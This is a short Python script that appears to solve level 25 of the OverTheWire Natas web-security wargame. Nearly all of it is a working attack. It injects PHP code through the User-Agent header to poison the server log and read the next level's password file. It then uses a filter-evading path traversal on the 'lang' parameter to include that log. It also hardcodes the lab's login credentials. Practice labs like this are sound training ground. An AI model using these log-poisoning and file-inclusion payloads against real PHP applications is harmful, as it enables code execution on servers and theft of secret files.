import requests
from requests.auth import HTTPBasicAuth

uri = 'http://natas25.natas.labs.overthewire.org/'

p = requests.post(uri,
    auth=HTTPBasicAuth('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'),
    data={'lang' : 'natas_webpass'},
    headers={'User-Agent' : '<?php phpinfo(); echo readfile("/etc/natas_webpass/natas26"); ?>'},
    # headers={'User-Agent' : '; phpinfo()'},
    cookies={'PHPSESSID' : 'umphack'})
print( p.text )

g = requests.post(uri,
    auth=HTTPBasicAuth('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'),
    data={'lang' : '....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_umphack.log'},
    cookies={'PHPSESSID' : 'umphack'})

print( g.text )
